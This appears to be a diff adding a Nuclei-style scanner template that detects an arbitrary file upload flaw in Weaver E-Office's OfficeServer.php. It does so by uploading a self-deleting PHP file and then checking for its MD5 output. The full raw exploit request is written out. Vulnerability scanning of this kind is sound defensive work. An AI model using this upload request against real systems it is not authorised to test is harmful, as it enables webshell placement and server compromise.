@@ -1,0 +1,47 @@
+id: weaver-eoffice-office-server-upload
+info:
+  name: Weaver E-Office OfficeServer.php File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver E-Office OfficeServer.php contains an arbitrary file upload vulnerability. Exploitation allows attackers to upload arbitrary files (like webshells), execute commands, and access sensitive data.
+  tags: fileupload, weaver, eoffice
+http:
+  - raw:
+      - |+
+        POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Origin: null
+
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FileData"; filename="test.php"
+        Content-Type: application/php
+
+        <?php echo md5(233);unlink(__FILE__);?>
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FormData"
+
+        {"USERNAME":"","RECORDID":"undefined","OPTION":"SAVEFILE","FILENAME":"test.php"}
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?i)errors"
+        negative: true
+  - raw:
+      - |+
+        GET /eoffice10/server/public/iWebOffice2015/Document/test.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "e165421110ba03099a1c0393373c5b43"
